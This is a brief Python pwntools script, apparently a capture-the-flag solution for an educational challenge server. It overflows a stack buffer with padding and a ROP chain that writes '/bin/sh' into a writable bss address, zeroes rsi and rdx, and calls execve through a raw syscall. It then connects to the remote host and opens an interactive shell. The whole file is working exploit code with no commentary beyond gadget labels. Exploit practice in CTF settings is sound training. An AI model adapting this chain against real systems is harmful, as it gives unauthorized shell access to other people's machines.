from pwn import *

context(os='linux', arch='amd64', log_level='debug')

pop_rdi = 0x0000000000400686
pop_rdx_pop_rsi = 0x000000000044beb9
pop_rax = 0x0000000000415714
pop_rsi = 0x00000000004100f3
mov_q_rdi_rsi = 0x000000000044709b # mov qword ptr [rdi], rsi
syscall = 0x000000000040125c
bss = 0x6bb2e0 # find somewhere writable


p = b'a' * (0x30 + 8)
p += flat(
    # bss <- "/bin/sh"
    pop_rsi,
    b'/bin/sh\0',
    pop_rdi,
    bss,
    mov_q_rdi_rsi,

    # rdi = &bss
    pop_rdi,
    bss,

    # rdx = rsi = 0
    pop_rdx_pop_rsi,
    0,
    0,

    pop_rax,
    0x3b,

    syscall,
)


r = remote('edu-ctf.csie.org', 10173)
#  r = remote('localhost', 1111)
pause()
r.sendlineafter('\n', p)
r.interactive()
